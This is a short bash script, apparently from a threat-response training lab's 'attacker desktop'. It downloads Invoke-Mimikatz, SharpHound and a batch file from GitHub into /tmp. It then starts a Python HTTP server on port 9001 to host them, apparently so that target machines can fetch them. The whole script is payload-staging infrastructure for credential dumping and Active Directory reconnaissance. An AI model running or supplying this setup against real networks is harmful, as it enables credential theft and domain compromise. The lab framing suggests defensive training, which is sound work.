#!/bin/bash
wget https://raw.githubusercontent.com/mosesrenegade/cyber-threat-response-clinic/master/servers/attacker-desktop/Invoke-Mimikatz.ps1 -O /tmp/Invoke-Mimikatz.ps1
wget https://raw.githubusercontent.com/mosesrenegade/cyber-threat-response-clinic/master/servers/attacker-desktop/safe.bat -O /tmp/safe.bat
wget https://raw.githubusercontent.com/mosesrenegade/cyber-threat-response-clinic/master/servers/attacker-desktop/SharpHound.ps1 -O /tmp/SharpHound.ps1
cd /tmp
python -m 'SimpleHTTPServer' 9001

